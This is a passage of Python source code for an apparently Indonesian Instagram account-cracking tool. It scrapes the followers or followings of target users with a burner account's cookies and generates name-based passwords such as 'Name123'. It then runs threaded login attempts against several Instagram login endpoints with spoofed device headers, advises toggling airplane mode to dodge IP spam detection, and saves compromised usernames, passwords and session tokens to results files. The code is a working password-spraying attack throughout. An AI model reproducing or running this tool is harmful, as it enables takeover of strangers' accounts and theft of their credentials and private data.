			fbid = profil_info_target["fbid"]
		except Exception as e:
			post, peng, meng, mail, fullname, fbid, phone = None, None, None, None, None,  None, None
	return post, peng, meng, mail, fullname, fbid, phone



def Aset_Ig():
    os.system('clear')
    if os.path.isfile('.Cokies-IG.txt') is True:
        coki = {'cookie': open('.Cokies-IG.txt', 'r').read()}
    else:
        print(f"{P}[/] Silahkan Masukan Cookies Akun Instagram Pastikan Menggunakan Akun Tumbal!")
        raraky = {'cookie':input("\ncookie: ")}
        if raraky['cookie'] == 'res':
            coki = {'cookie':find_res()}
        else:
            coki = raraky
    try:
        uid = re.search(r'ds_user_id=(\d+)', str(coki['cookie'])).group(1)
        req = requests.get(f'https://i.instagram.com/api/v1/users/{uid}/info/', headers=ua, cookies=coki).json()
        if 'user' in req:
            req = req['user']
            open('.Cokies-IG.txt', 'w').write(f'{coki["cookie"]}')
            full_name = req['full_name']
            username = req['username']
            follower_count = req['follower_count']
            following_count = req['following_count']
            media_count = req['media_count']
            return coki, full_name, username, follower_count, following_count, media_count
        else:
            os.system('rm -rf .Cokies-IG.txt')
            print(f" {M}cookies Invalid Gunakan Cookies yang Lain!")
            time.sleep(3)
            return None, None, None, None, None, None  
    except Exception as e:
        os.system('rm -rf .Cokies-IG.txt')
        print(f" {M}cookies Invalid Gunakan Cookies yang Lain!")
        time.sleep(3)
        return None, None, None, None, None, None 


def login_to_instagram(username, password):
    url = 'https://www.instagram.com/accounts/login/ajax/'
    response = ses.get('https://www.instagram.com/accounts/login/', headers=headers_log)
    csrf_token = response.cookies.get('csrftoken')
    login_headers = {
        'User-Agent': generate_random_ua(),
        'X-CSRFToken': csrf_token,
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'en-US,en;q=0.9',
        'Content-Type': 'application/x-www-form-urlencoded',
        'X-Requested-With': 'XMLHttpRequest',
        'Referer': 'https://www.instagram.com/accounts/login/',
    }

    data = {
        'username': username,
        'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:1605155817:{password}',  # Format the password with timestamp
    }
    login_response = ses.post(url, headers=login_headers, data=data, cookies={'csrftoken': csrf_token})
    if login_response.status_code == 200 and 'authenticated' in login_response.json() and login_response.json()['authenticated']:
        x = ses.get("https://i.instagram.com/api/v1/users/web_profile_info/?username=%s" % username, headers={"user-agent": generate_random_ua(), "x-ig-app-id": '936619743392459'})
        usres = ses.get('https://www.instagram.com/push/web/get_push_info').json()['data']['user_id']
        x_json = x.json()["data"]["user"]
        pengikut = x_json["edge_followed_by"]["count"]
        mengikut = x_json["edge_follow"]["count"]
        postingan = x_json["edge_owner_to_timeline_media"]["count"]
        cookie = ";".join([key + "=" + value.replace('"', '') for key, value in ses.cookies.get_dict().items()])
        print(f"\n{B}{username} {password}{N}")
        print(f"{H}Followers: {O}{pengikut}{N}")
        print(f"{H}Posts: {O}{postingan}{N}")
        print(f"{H}Following: {O}{mengikut}{N}")
        print(f"{B}Cookies:{N}\n{P}{cookie}{N}")
        print(f"{H}Login successful!{N}")
        print(f"{H}User ID Akun: {O}{usres}{N}")
    else:
        prints(Panel(f"{P2}opshh akun tumbal mu terkena checkpoint, silahkan login dengan akun lain.",width=80,style=f"bold green"));os.system('rm -rf .kukis.txt');exit()
        return False
        

def menu():
    os.system('clear')
    aset, full_name, username, fol, following, media = Aset_Ig()
    if aset is None:
        time.sleep(3)
        return
    os.system('clear')
    tabel1 = f"[bold white]01\n02\n00"
    tabel2 = (
        f"[bold white]Crack Dari Pengikut\nCrack Dari Mengikuti\nGanti Cookie"
    )
    tabel3 = f"[bold white]ON\nON\nON"
    colume_tabel = me()
    colume_tabel.add_column("NO", style="bold green", justify='center')
    colume_tabel.add_column("PILIHAN", style="bold green", justify='center', width=55)
    colume_tabel.add_column("STATUS", style="bold green", justify='center')
    colume_tabel.add_row(tabel1, tabel2, tabel3)
    sol().print(colume_tabel, justify='start', style="bold blue")
    x = input('└──╭➣ Pilih 1 Sampai 3: ')
    if x in ['01','1']:
        dumps(aset, True)
    elif x in ['02','2']:
        dumps(aset, False)
    elif x in ['00','0']:
        os.system('rm -rf .Cokies-IG.txt')
        print("berhasil menghapus cookies")
        exit()

def dumps(kuki, typess, xyz=[]):
	if 'csrftoken' not in str(kuki):
		try:
			memek = requests.get('https://www.instagram.com/data/shared_data/', cookies=kuki).json()
			token = memek['config']['csrf_token']
			kuki['cookie'] += ';csrftoken=%s;' % (token)
		except:
			os.system('rm -rf .Cokies-IG.txt')
			exit()
	prints(Panel.fit(f"\n[bold white] Masukan Target Username Anda",style='bold blue'))      
	users = input(f'└──╭➣ Targets User : {b}').split(',')
	print(f" \n└──╭➣ Process Collecting Username.....")         
	threads = []
	for y in users:
		thread = threading.Thread(target=process_user, args=(y, kuki, typess, xyz))
		threads.append(thread)
		thread.start()
	for thread in threads:
		thread.join()
	print("")
	Metode()

def process_user(user, kuki, typess, xyz):
	req = requests.get(f'https://www.instagram.com/{user}/', cookies=kuki).text
	match = re.search(r'"user_id":"(\d+)"', str(req))
	if match:
		uid = match.group(1)
		if uid not in xyz:
			xyz.append(uid)
		mode = 'followers' if typess is True else 'following'
		Graphql(typess, uid, kuki['cookie'], '')

def Graphql(typess, userid, cokie, after):
    global xx
    api = "https://www.instagram.com/graphql/query/"
    csr = 'variables={"id":"%s","first":24,"after":"%s"}' % (userid, after)
    mek = "query_hash=58712303d941c6855d4e888c5f0cd22f&{}".format(csr) if typess is False else "query_hash=37479f2b8209594dde7facb0d904896a&{}".format(csr)
    try:
        ptk = {
            "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36",
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            "cookie": cokie
        }
        req = requests.get(api, params=mek, headers=ptk).json()
        if 'require_login' in req:
            if len(Uuid) > 0:
                pass
            else:
                exit(f'\n{B}[{b}●{B}]{M} Invalid Cookie')
        khm = 'edge_followed_by' if typess is True else 'edge_follow'
        for xyz in req['data']['user'][khm]['edges']:
            username = xyz['node']['username']
            xy = xyz['node']['username'] + '|' + xyz['node']['full_name']
            if xy not in Uuid:
                xx += 1
                Uuid.append(xy)
                print(f'\r └──╭➣ Mendapatkan ID : {b}{len(Uuid)}', end='')
                open('dump.txt', 'w').write('\n'.join(Uuid))
        end = req['data']['user'][khm]['page_info']['has_next_page']
        if end is True:
            after = req['data']['user'][khm]['page_info']['end_cursor']
            Graphql(typess, userid, cokie, after)
    except:
        pass


def Metode(): 
	global Login_Dengan
	prints(Panel(f"{P2}Total Username Terkumpul : [bold green]{len(Uuid)}[bold white]",width=80,padding=(0,20),style=f"bold blue"))
	tabel1 = f"[bold white]01\n02\n03"
	tabel2 = (
		f"[bold white]Instagram Metode [ www.instagram.com ]\Instagram Metode [ i.instagram.com ]\nInstagram Metode [ i.instagram.com/ajax ]\nLogin Instagram With Metode [ www.instagram.com/v2 ]"
	)
	tabel3 = f"[bold white]ON\nON\nON"
	colume_tabel = me()
	colume_tabel.add_column("NO", style="bold green", justify='center')
	colume_tabel.add_column("PILIHAN", style="bold green", justify='center', width=55)
	colume_tabel.add_column("STATUS", style="bold green", justify='center')
	colume_tabel.add_row(tabel1, tabel2, tabel3)
	sol().print(colume_tabel, justify='start', style="bold green")
	method = input('└──╭➣ Pilih Metode 1 Sampai 4: ')
	if method in ['01','1']: Login_Dengan = "api.instagram.com"
	elif method in ['02','2']: Login_Dengan = "i.instagram.com"
	elif method in ['03','3']: Login_Dengan = "www.instagram.com"
	elif method in ['04','4']: Login_Dengan = "web.instagram.com"
	else:Login_Dengan = "api.instagram.com"
	SetCrack()

xxkontol = []
def SetCrack():
	xxkontol.append(Panel(f"""{H2}Hasil OK DiSimpan Di{P2}: {P2}RESULTS-INSTAGRAM/{b}{Okc}""",width=39,style=f"bold blue"))
	xxkontol.append(Panel(f"""{K2}Hasil CP DiSimpan Di{P2}: {P2}RESULTS-INSTAGRAM/{b}{Cpc}""",width=39,style=f"bold blue"))
	console.print(Columns(xxkontol))
	prints(Panel(f"{P2}Crack Di Mulai Tekan [bold green]'Ctrl+Z'{P2} Di Keyboard Anda Jika Ingin Berhenti\n\n        {P2}Hidupkan Mode Pesawat 5 Detik Jika Terdeteksi Spam IP",width=80,padding=(0,4),style=f"bold blue"))
	with ThreadPoolExecutor (max_workers=30) as ASF:
		for i in Uuid:
			try:
				username, name = i.split('|')
				kontol = Password(name)
				if Login_Dengan == "api.instagram.com":
					ASF.submit(Crack_api, username, kontol)
				elif Login_Dengan == "i.instagram.com":
					ASF.submit(Crack_i, username, kontol)
				elif Login_Dengan == "www.instagram.com":
					ASF.submit(crack_ajax, username, kontol)
				elif Login_Dengan == "web.instagram.com":
					ASF.submit(crack, username, kontol)
			except:pass
	exit(' \n\n Crack Telah Selesai')
	
def Password(name):
	xxzx = []
	full = name.replace('_', ' ').replace('.', ' ').replace('@', ' ')
	for nama in full.split(' '):
		if len(nama) < 3: 
			continue
		base_nama = nama.replace(' ', '').capitalize()
		xxzx.append(base_nama)
		xxzx.append(base_nama + '01')
		xxzx.append(base_nama + '02')
		xxzx.append(base_nama + '03')
		xxzx.append(base_nama + '04')
		xxzx.append(base_nama + '05')
		xxzx.append(base_nama + '06')
		xxzx.append(base_nama + '07')
		xxzx.append(base_nama + '08')
		xxzx.append(base_nama + '09')
		xxzx.append(base_nama + '10')
		if len(nama) >= 4:
			xxzx.append(base_nama + '12')        	
			xxzx.append(base_nama + '123')
			xxzx.append(base_nama + '1234')
			xxzx.append(base_nama + '12345')
			xxzx.append(base_nama + '123456')
		else:
			xxzx.append('kamu nanya')
			xxzx.append('sayangku123')
			xxzx.append('Bengkulu')
	return xxzx





def Crack_api(username, memek):
	global Ok, Cp, Loop
	bo = random.choice([u])
	sys.stdout(f" └──╭➣ Runing [ {Loop} ] {P2} Mendapatkan [ {H2}{str(len(Uuid))}{P2} ] {P2}Success [ {Ok} ] {P2} Failed [ {Cp} ]", end="\r")
	sys.stdout.flush()
	for password in memek:
		try:
			ses = requests.Session()
			uag = UserAgentApp()
			device_id, family_device_id = str(uuid.uuid4()), str(uuid.uuid4())
			_hash = hashlib.md5()
			_hash.update(username.encode('utf-8') + password.encode('utf-8'))
			hex_ = _hash.hexdigest()
			_hash.update(hex_.encode('utf-8') + '12345'.encode('utf-8'))
			ses.headers.update({
				'x-fb-http-engine': 'Liger',
				'Host': 'i.instagram.com',
				'x-bloks-version-id': '5f56efad68e1edec7801f630b5c122704ec5378adbee6609a448f105f34a9c73',
				'x-ig-capabilities': '3brTv10=',
				'x-ig-device-id': device_id,
				'x-tigon-is-retry': 'True, True',
				'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
				'x-ig-connection-type': 'MOBILE(LTE)',
				'connection': 'keep-alive',
				'x-ig-bandwidth-totaltime-ms': str(random.randint(2000, 9000)),
				'x-ig-www-claim': '0',
				'x-ig-bandwidth-totalbytes-b': str(random.randint(5000000, 90000000)),
				'x-ig-mapped-locale': 'id_ID',
				'x-pigeon-rawclienttime': '{:.6f}'.format(time.time()),
				'x-ig-app-locale': 'in_ID',
				'x-ig-bandwidth-speed-kbps': str(random.randint(2500000, 3000000) / 1000),
				'user-agent': uag,
				'x-ig-family-device-id': family_device_id,
				'x-bloks-is-layout-rtl': 'False',
				'x-fb-connection-type': 'MOBILE.LTE',
				'x-fb-server-cluster': 'True',
				'accept-language': 'id-ID, en-US',
				'ig-intended-user-id': '0',
				'x-ig-app-id': '3419628305025917',
				'x-ig-android-id': f'android-{_hash.hexdigest()[:16]}',
				'priority': 'u=3',
				'x-ig-timezone-offset': str(-time.timezone),
				'x-ig-device-locale': 'in_ID',
				'x-pigeon-session-id': f'UFS-{str(uuid.uuid4())}-0',
				'x-fb-client-ip': 'True'
			})
			data = (f'params=%7B%22client_input_params%22%3A%7B%22device_id%22%3A%22android-{_hash.hexdigest()[:16]}%22%2C%22login_attempt_count%22%3A1%2C%22secure_family_device_id%22%3A%22%22%2C%22machine_id%22%3A%22%22%2C%22accounts_list%22%3A%5B%5D%2C%22auth_secure_device_id%22%3A%22%22%2C%22password%22%3A%22%23PWD_INSTAGRAM%3A0%3A{str(int(datetime.datetime.now().timestamp()))}%3A{urllib.request.quote(str(password))}%22%2C%22family_device_id%22%3A%22{family_device_id}%22%2C%22fb_ig_device_id%22%3A%5B%5D%2C%22device_emails%22%3A%5B%5D%2C%22try_num%22%3A3%2C %22event_flow%22%3A%22login_manual%22%2C%22event_step%22%3A%22home_page%22%2C%22openid_tokens%22%3A%7B%7D%2C%22client_known_key_hash%22%3A%22%22%2C%22contact_point%22%3A%22{urllib.request.quote(str(username))}%22%2C%22encrypted_msisdn%22%3A%22%22%7D%2C%22server_params%22%3A%7B%22username_text_input_id%22%3A%22p5hbnc%3A46%22%2C%22device_id%22%3A%22android-{_hash.hexdigest()[:16]}%22%2C%22should_trigger_override_login_success_action%22%3A0%2C%22server_login_source%22%3A%22login%22%2C%22waterfall_id%22%3A%22{urllib.request.quote(str(uuid.uuid4()))}%22%2C%22login_source%22%3A%22Login%22%2C%22INTERNAL__latency_qpl_instance_id%22%3A152086072800150%2C%22reg_flow_source%22%3A%22login_home_native_integration_point%22%2C%22is_platform_login%22%3A0%2C%22is_caa_perf_enabled%22%3A0%2C%22credential_type%22%3A%22password%22%2C%22family_device_id%22%3A%22{family_device_id}%22%2C%22INTERNAL__latency_qpl_marker_id%22%3A36707139%2C%22offline_experiment_group%22%3A%22caa_iteration_v3_perf_ig_4%22%2C%22INTERNAL_INFRA_THEME%22%3A%22harm_f%22%2C%22password_text_input_id%22%3A%22p5hbnc%3A47%22%2C%22ar_event_source%22%3A%22login_home_page%22%7D%7D&bk_client_context=%7B%22bloks_version%22%3A%225f56efad68e1edec7801f630b5c122704ec5378adbee6609a448f105f34a9c73%22%2C%22styles_id%22%3A%22instagram%22%7D&bloks_versioning_id=5f56efad68e1edec7801f630b5c122704ec5378adbee6609a448f105f34a9c73')
			response = ses.post('https://i.instagram.com/api/v1/bloks/apps/com.bloks.www.bloks.caa.login.async.send_login_request/', data=data, allow_redirects=True)
			if 'Bearer IGT:2:' in str(response.text.replace('\\', '')) and '"pk_id":' in str(response.text.replace('\\', '')):
				try:
					ig_set_authorization = re.search('"IG-Set-Authorization": "(.*?)"', str(response.text.replace('\\', ''))).group(1)
					try:
						decode_ig_set_authorization = json.loads(base64.urlsafe_b64decode(ig_set_authorization.split('Bearer IGT:2:')[1]))
						cookies = (";".join([str(x) + "=" + str(y) for x, y in decode_ig_set_authorization.items()]))
					except Exception as e:
						cookies = ('-')
				except Exception as e:
					ig_set_authorization = (None)
				Ok += 1
				post, peng, meng, mail, fullname, fbid, phone = data_target(username)
				print(f"                                                                ", end='\r')
				time.sleep(0.10)
				tree = Tree(Panel.fit(f"{H2}{fullname}{P2}"))
				tree.add(Panel.fit(f"{P2}Username : {H2}{username}")).add(Panel.fit(f"{P2}Password : {H2}{password}"))
				tree.add(Panel.fit(f"{P2}Followers : {H2}{peng}")).add(Panel.fit(f"{P2}Following : {H2}{meng}"))
				tree.add(Panel.fit(f"{N2}{ig_set_authorization}{cookies}{P2}"))
				prints(tree)
				open('RESULTS-INSTAGRAM/'+Okc, 'a').write(f"{username}|{password}|{peng}")
				break
			elif 'challenge_required' in str(response.text.replace('\\', '')) or 'https://i.instagram.com/challenge/' in str(response.text.replace('\\', '')):
				Cp += 1
				post, peng, meng, mail, fullname, fbid, phone = data_target(username)
				print(f"                                                                ", end='\r')
				time.sleep(0.10)
				tree = Tree(Panel.fit(f"{K2}{fullname}{P2}"))
				tree.add(Panel.fit(f"{P2}Username : {K2}{username}")).add(Panel.fit(f"{P2}Password : {K2}{password}"))
				tree.add(Panel.fit(f"{P2}Followers : {K2}{peng}")).add(Panel.fit(f"{P2}Following : {K2}{meng}"))
				tree.add(Panel.fit(f"{N2}{uag}{P2}"))
				prints(tree)
				open('RESULTS-INSTAGRAM/'+Cpc, 'a').write(f"{username}|{password}|{peng}")
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(20)
	Loop += 1

def Crack_i(username, memek):
	global Ok, Cp, Loop
	bo = random.choice([u])
	sys.stdout(f" └──╭➣ Runing [ {Loop} ] {P2} Mendapatkan [ {H2}{str(len(Uuid))}{P2} ] {P2}Success [ {Ok} ] {P2} Failed [ {Cp} ]", end="\r")
	sys.stdout.flush()
	for password in memek:
		try:
			ua = UserAgentApp()
			ses = requests.Session()
			device_id, family_device_id = str(uuid.uuid4()), str(uuid.uuid4())
			_hash = hashlib.md5()
			_hash.update(username.encode('utf-8') + password.encode('utf-8'))
			hex_ = _hash.hexdigest()
			_hash.update(hex_.encode('utf-8') + '12345'.encode('utf-8'))
			ses.headers.update({'authority': 'i.instagram.com','x-bloks-version-id': '8dab28e76d3286a104a7f1c9e0c632386603a488cf584c9b49161c2f5182fe07','x-bloks-is-layout-rtl': 'false','x-ig-capabilities': '3brTv10=','content-type': 'application/x-www-form-urlencoded; charset=UTF-8','x-ig-connection-type': 'MOBILE(LTE)','x-ig-bandwidth-totaltime-ms': '0','x-ig-www-claim': '0','x-ig-bandwidth-totalbytes-b': '0','x-ig-mapped-locale': 'id_ID','x-pigeon-rawclienttime': '{:.6f}'.format(time.time()),'x-ig-app-locale': 'in_ID','x-ig-bandwidth-speed-kbps': '-1.000','user-agent': ua,'x-ig-family-device-id': family_device_id,'x-fb-connection-type': 'MOBILE.LTE','x-ig-device-id': device_id,'x-fb-server-cluster': 'True','x-fb-http-engine': 'Liger','ig-intended-user-id': '0','x-ig-app-id': '567067343352427','x-ig-android-id': f'android-{_hash.hexdigest()[:16]}','x-ig-timezone-offset': str(-time.timezone),'priority': 'u=3','x-ig-device-locale': 'in_ID','x-pigeon-session-id': f'UFS-{str(uuid.uuid4())}-0','x-fb-client-ip': 'True',})
			data = (f'signed_body=SIGNATURE.%7B%22country_codes%22%3A%22%5B%7B%5C%22country_code%5C%22%3A%5C%2262%5C%22%2C%5C%22source%5C%22%3A%5B%5C%22default%5C%22%5D%7D%5D%22%2C%22phone_id%22%3A%22{urllib.request.quote(str(uuid.uuid4()))}%22%2C%22enc_password%22%3A%22%23PWD_INSTAGRAM%3A0%3A{str(int(datetime.datetime.now().timestamp()))}%3A{urllib.request.quote(str(password))}%3D%22%2C%22username%22%3A%22{urllib.request.quote(str(username))}%22%2C%22adid%22%3A%22{urllib.request.quote(str(uuid.uuid4()))}%22%2C%22guid%22%3A%22{urllib.request.quote(str(device_id))}%22%2C%22device_id%22%3A%22android-{urllib.request.quote(str(_hash.hexdigest()[:16]))}%22%2C%22google_tokens%22%3A%22%5B%5D%22%2C%22login_attempt_count%22%3A%220%22%7D')
			response = ses.post('https://b.i.instagram.com/api/v1/accounts/login/', data=data)
			if 'logged_in_user' in str(response.text) and '"pk_id":' in str(response.text):
				ig_set_authorization = f"{response.headers.get('ig-set-authorization')}"
				Ok += 1
				post, peng, meng, mail, fullname, fbid, phone = data_target(username)
				print(f"                                                                ", end='\r')
				time.sleep(0.10)
				tree = Tree(Panel.fit(f"{H2}{fullname}{P2}"))
				tree.add(Panel.fit(f"{P2}Username : {H2}{username}")).add(Panel.fit(f"{P2}Password : {H2}{password}"))
				tree.add(Panel.fit(f"{P2}Followers : {H2}{peng}")).add(Panel.fit(f"{P2}Following : {H2}{meng}"))
				tree.add(Panel.fit(f"{N2}{ig_set_authorization}{P2}"))
				prints(tree)
				open('RESULTS-INSTAGRAM/'+Okc, 'a').write(f"{username}|{password}|{peng}")
				break
			elif 'checkpoint' in str(response.text.replace('\\', '')) or 'https://i.instagram.com/challenge/' in str(response.text.replace('\\', '')):
				Cp += 1
				post, peng, meng, mail, fullname, fbid, phone = data_target(username)
				print(f"                                                                ", end='\r')
				time.sleep(0.10)
				tree = Tree(Panel.fit(f"{K2}{fullname}{P2}"))
				tree.add(Panel.fit(f"{P2}Username : {K2}{username}")).add(Panel.fit(f"{P2}Password : {K2}{password}"))
				tree.add(Panel.fit(f"{P2}Followers : {K2}{peng}")).add(Panel.fit(f"{P2}Following : {K2}{meng}"))
				tree.add(Panel.fit(f"{N2}{ua}{P2}"))
				prints(tree)
				open('RESULTS-INSTAGRAM/'+Cpc, 'a').write(f"{username}|{password}|{peng}")
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(20)
	Loop += 1

def cookie_bearer(cookie):
	abcd = json.loads(base64.b64decode(cookie).decode())
	coki = ';'.join(['%s=%s' % (x, y) for x, y in abcd.items()])
	return coki + f';dpr=2;ig_did={str(uuid.uuid4()).upper()}'

def x_mid(mid_list):
	if len(mid_list) > 0:
		return random.choice(mid_list)
	lr = 'abcdefghijklmnopqrstuvwxyz1234567890'
	xc = ''.join(random.choice(lr.upper()) for _ in range(6))
	return f'ZpFI1wABAAET6tZpG_yS09{xc}'



def crack_ajax(username, memek):
	global Ok, Cp, Loop
	bo = random.choice([m, b, k, h, u])
	sys.stdout(f" └──╭➣ Runing [ {Loop} ] {P2} Mendapatkan [ {H2}{str(len(Uuid))}{P2} ] {P2}Success [ {Ok} ] {P2} Failed [ {Cp} ]", end="\r")
	sys.stdout.flush()    
	for password in memek:
		try:
			ses = requests.Session()
			uag = UserAgentApp()
			device_id, family_device_id = str(uuid.uuid4()), str(uuid.uuid4())
			_hash = hashlib.md5()
			_hash.update(username.encode('utf-8') + password.encode('utf-8'))
			hex_ = _hash.hexdigest()
			_hash.update(hex_.encode('utf-8') + '12345'.encode('utf-8'))
			# Update headers
			headers = {
				'host': 'i.instagram.com',
				'x-ig-app-locale': 'en_US',
				'x-ig-device-locale': 'in_ID',
				'x-ig-mapped-locale': 'en_US',
				'x-pigeon-session-id': f'UFS-{str(uuid.uuid4())}-1',
				'x-pigeon-rawclienttime': f'{str(time.time())[:14]}',
				'x-ig-bandwidth-speed-kbps': f'{random.randint(50, 250)}.000',
				'x-ig-bandwidth-totalbytes-b': '0',
				'x-ig-bandwidth-totaltime-ms': '0',
				'x-bloks-version-id': '9fc6a7a4a577456e492c189810755fe22a6300efc23e4532268bca150fe3e27a',
				'x-ig-www-claim': '0',
				'x-bloks-is-prism-enabled': 'false',
				'x-bloks-is-layout-rtl': 'false',
				'x-ig-device-id': device_id,
				'x-ig-family-device-id': family_device_id,
				'x-ig-android-id': f'android-{str(uuid.uuid4())[:16]}',
				'x-ig-timezone-offset': str(-time.timezone),
				'x-fb-connection-type': 'MOBILE.LTE',
				'x-ig-connection-type': 'MOBILE(LTE)',
				'x-ig-capabilities': '3brTv10=',
				'x-ig-app-id': '567067343352427',
				'priority': 'u=3',
				'user-agent': uag,
				'x-mid': '567067343352427',  # Ganti dengan nilai MID yang sesuai
				'ig-intended-user-id': '0',
				'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
				'accept-encoding': 'gzip, deflate',
				'x-fb-http-engine': 'Liger',
				'x-fb-client-ip': 'True',
				'x-fb-server-cluster': 'True',
				'x-requested-with': 'com.instagram.android',
				'Connection': 'keep-alive'}
			ses.headers.update(headers)
			data = (f'params=%7B %22client_input_params%22%3A%7B%22device_id%22%3A%22{device_id}%22%2C%22name%22%3A%22{username}%22%2C%22machine_id%22%3A%22{str(uuid.uuid4())}%22%2C%22contact_point%22%3A%22{username}%22%2C%22encrypted_password%22%3A%22%23PWD_INSTAGRAM%3A0%3A{round(time.time())}%3A{password}%22%7D%7D&bk_client_context=%7B%22bloks_version%22%3A%229fc6a7a4a577456e492c189810755fe22a6300efc23e4532268bca150fe3e27a%22%2C%22styles_id%22%3A%22instagram%22%7D&bloks_versioning_id=9fc6a7a4a577456e492c189810755fe22a6300efc23e4532268bca150fe3e27a')
			response = ses.post('https://i.instagram.com/api/v1/bloks/apps/com.bloks.www.bloks.caa.login.async.send_google_smartlock_login_request/', data=data, allow_redirects=True)

			if 'Bearer IGT:2:' in str(response.text.replace('\\', '')) and '"pk_id":' in str(response.text.replace('\\', '')) or "logged_in_user" in str(response.text.replace('\\', '')):
				try:
					ig_set_authorization = re.search('"IG-Set-Authorization": "(.*?)"', str(response.text.replace('\\', ''))).group(1)
					try:
						decode_ig_set_authorization = json.loads(base64.urlsafe_b64decode(ig_set_authorization.split('Bearer IGT:2:')[1]))
					except Exception:
						cookies = '-'
				except Exception:
					ig_set_authorization = None

				Ok += 1
				post, peng, meng, mail, fullname, fbid, phone = data_target(username)  # Pastikan data_target didefinisikan
				print(f"                                                                ", end='\r')
				time.sleep(0.10)
				tree = Tree(Panel.fit(f"{H2}{fullname}{P2}"))
				tree.add(Panel.fit(f"{P2}Username : {H2}{username}")).add(Panel.fit(f"{P2}Password : {H2}{password}"))
				tree.add(Panel.fit(f"{P2}Followers : {H2}{peng}")).add(Panel.fit(f"{P2}Following : {H2}{meng}"))
				tree.add(Panel.fit(f"{N2}{ig_set_authorization}{cookies}{P2}"))
				prints(tree)
				open(f'RESULTS-INSTAGRAM/{Okc}', 'a').write(f"{username}|{password}|{peng}")
				break
			elif 'challenge_required' in str(response.text.replace('\\', '')) or 'https://i.instagram.com/challenge/' in str(response.text.replace('\\', '')):
				Cp += 1
				post, peng, meng, mail, fullname, fbid, phone = data_target(username)
				print(f"                                                                ", end='\r')
				time.sleep(0.10)
				tree = Tree(Panel.fit(f"{K2}{fullname}{P2}"))
				tree.add(Panel.fit(f"{P2}Username : {K2}{username}")).add(Panel.fit(f"{P2}Password : {K2}{password}"))
				tree.add(Panel.fit(f"{P2}Followers : {K2}{peng}")).add(Panel.fit(f"{P2}Following : {K2}{meng}"))
				tree.add(Panel.fit(f"{N2}{ua}{P2}"))
				prints(tree)
				open(f'RESULTS-INSTAGRAM/{Cpc}', 'a').write(f"{username}|{password}|{peng}")
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(20)
	Loop += 1

def crack(username, memek):
	global Ok, Cp, Loop
	bo = random.choice([m, b, k, h, u])
	sys.stdout(f" └──╭➣ Runing [ {Loop} ] {P2} Mendapatkan [ {H2}{str(len(Uuid))}{P2} ] {P2}Success [ {Ok} ] {P2} Failed [ {Cp} ]", end="\r")
	sys.stdout.flush()    
	for password in memek:
		try:
			url = 'https://www.instagram.com/accounts/login/ajax/'
			response = ses.get('https://www.instagram.com/accounts/login/', headers=headers_log)
			csrf_token = response.cookies.get('csrftoken')
			login_headers = {
				'User-Agent': generate_random_ua(),
				'X-CSRFToken': csrf_token,
				'Accept': 'application/json, text/javascript, */*; q=0.01',
				'Accept-Encoding': 'gzip, deflate, br',
				'Accept-Language': 'en-US,en;q=0.9',
				'Content-Type': 'application/x-www-form-urlencoded',
				'X-Requested-With': 'XMLHttpRequest',
				'Referer': 'https://www.instagram.com/accounts/login/',
			}

			data = {
				'username': username,
				'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:1605155817:{password}',  # Format the password with timestamp
			}

			login_response = ses.post(url, headers=login_headers, data=data, cookies={'csrftoken': csrf_token})
			if 'Bearer IGT:2:' in str(login_response.text.replace('\\', '')) and '"pk_id":' in str(login_response.text.replace('\\', '')) or "logged_in_user" in str(login_response.text.replace('\\', '')):
				x = ses.get("https://i.instagram.com/api/v1/users/web_profile_info/?username=%s" % username, headers={"user-agent": generate_random_ua(), "x-ig-app-id": '936619743392459'})
				x_json = x.json()["data"]["user"]
				pengikut = x_json["edge_followed_by"]["count"]
				mengikut = x_json["edge_follow"]["count"]
				postingan = x_json["edge_owner_to_timeline_media"]["count"]
				cookie = ";".join([key + "=" + value.replace('"', '') for key, value in ses.cookies.get_dict().items()])
				print(f"\n{B}{username} {password}{N}")
				print(f"{H}Followers: {O}{pengikut}{N}")
				print(f"{H}Posts: {O}{postingan}{N}")
				print(f"{H}Following: {O}{mengikut}{N}")
				print(f"{B}Cookies:{N}\n{P}{cookie}{N}")
			elif 'challenge_required' in str(login_response.text.replace('\\', '')) or 'https://i.instagram.com/challenge/' in str(login_response.text.replace('\\', '')):
				Cp += 1
				post, peng, meng, mail, fullname, fbid, phone = data_target(username)
				print(f"                                                                ", end='\r')
				time.sleep(0.10)
				print(f" {b}╰─{b}▶{P} Fullname  :{k} {fullname} ")
				print(f" {b}╰─{b}▶{P} Username  :{k} {username} ")
				print(f" {b}╰─{b}▶{P} Password  :{k} {password} ")
				print(f" {b}╰─{b}▶{P} Followers :{k} {peng} ")
				print(f" {b}╰─{b}▶{P} Following :{k} {meng} ")
				open(f'RESULTS-INSTAGRAM/{Cpc}', 'a').write(f"{username}|{password}|{peng}")
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(20)
	Loop += 1

if __name__=='__main__':
	menu()